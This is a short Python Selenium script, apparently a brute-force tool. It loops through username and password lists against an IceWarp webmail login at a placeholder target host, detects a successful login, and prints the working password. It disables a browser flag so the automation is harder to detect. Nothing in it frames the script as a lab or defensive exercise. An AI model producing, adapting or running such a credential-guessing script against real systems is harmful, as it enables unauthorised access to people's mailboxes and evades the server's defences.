from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# --- CONFIG ---
ICEWARP_URL = "https://mail.target.com/webmail/"

# Load usernames
with open("username.txt", "r") as g:
    USERNAME = [line.strip() for line in g if line.strip()]

# Load passwords
with open("passwords.txt", "r") as f:
    PASSWORDS = [line.strip() for line in f if line.strip()]

# --- CHROME OPTIONS ---
options = webdriver.ChromeOptions()
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-gpu")
options.add_argument("--remote-debugging-port=9222")
options.add_argument("--disable-blink-features=AutomationControlled")

# --- DRIVER ---
driver = webdriver.Chrome(
    service=Service("/usr/local/bin/chromedriver"),
    options=options
)
driver.maximize_window()

try:
    for password in PASSWORDS:
        for username in USERNAME:
            print(f"🔑 Trying username: {username}")
            print(f"🔑 Trying password: {password}")

            driver.get(ICEWARP_URL)
            wait = WebDriverWait(driver, 2)

            # STEP 1: email
            email_field = wait.until(EC.presence_of_element_located((By.NAME, "email-address")))
            email_field.clear()
            email_field.send_keys(username)
            email_field.send_keys(Keys.RETURN)

            # STEP 2: password
            password_field = wait.until(
                EC.presence_of_element_located((By.XPATH, "//input[@type='password']"))
            )
            password_field.clear()
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)
            # --- CHECK SUCCESS: look for "Search in Emails" element ---
            try:
                wait.until(
                    EC.presence_of_element_located(
                        (By.XPATH, "//div[@class='bubbles']//span[contains(text(),'Search in Emails')]")
                    )
                )
                print(f"✅ Success! Password is: {password}")
                break
            except:
                print("❌ Wrong password.")
                continue

        else:
            print("❌ No password worked.")

finally:
    driver.quit()
